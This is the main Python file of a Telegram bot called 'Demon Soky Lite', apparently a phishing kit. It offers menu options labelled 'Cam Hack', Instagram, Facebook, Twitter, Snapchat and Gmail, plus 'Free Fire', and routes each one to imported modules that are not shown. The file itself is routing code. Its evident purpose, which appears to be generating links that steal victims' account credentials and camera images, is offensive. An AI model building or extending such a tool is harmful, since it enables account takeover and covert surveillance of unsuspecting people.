import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import time
from config import BOT_TOKEN
from modules import cam, social, insta, face, twit, snap, gmail, free

bot = telebot.TeleBot(BOT_TOKEN)

def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📱 Social Media"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🔗 All Links")
    )
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Cam Hack\n📱 Social Media\n📧 Gmail\n🎮 Free Fire\n🔗 All Links",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    text = message.text
    if text == "📸 Cam Hack":
        cam.handle_cam_hack(bot, message)
    elif text == "📱 Social Media":
        social.handle_social(bot, message)
    elif text == "📧 Gmail":
        gmail.handle_gmail(bot, message)
    elif text == "🎮 Free Fire":
        free.handle_free_fire(bot, message)
    elif text == "🔗 All Links":
        bot.send_message(message.chat.id, "⏳ All Links coming soon!")
    else:
        bot.send_message(message.chat.id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    data = call.data
    if data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
    elif data.startswith("ig_"):
        insta.handle_insta_callback(bot, call)
    elif data.startswith("fb_"):
        face.handle_face_callback(bot, call)
    elif data.startswith("tw_"):
        twit.handle_twit_callback(bot, call)
    elif data.startswith("snap_"):
        snap.handle_snap_callback(bot, call)
    elif data == "social_back":
        social.handle_social_back(bot, call)
    elif data == "back":
        start(call.message)

if __name__ == "__main__":
    print("🤖 Demon Soky Lite — Modular Bot Running...")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
